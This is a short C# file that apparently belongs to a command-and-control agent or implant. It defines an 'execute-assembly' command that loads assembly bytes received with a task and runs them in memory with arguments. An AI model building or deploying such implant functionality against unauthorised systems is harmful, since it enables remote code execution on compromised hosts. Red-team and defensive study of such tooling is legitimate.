using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Agent.Models;

namespace Agent.Commands
{
    public class ExecuteAssembly : AgentCommand 

    {
        public override string Name => "execute-assembly";
        public override string Execute(AgentTask task)
        {
            string[] args = null;
            if (task.Arguments != null)
                args = task.Arguments;
            return Utils.Execute.ExecuteAssembly(task.FileBytes, args);
        }
    }
}
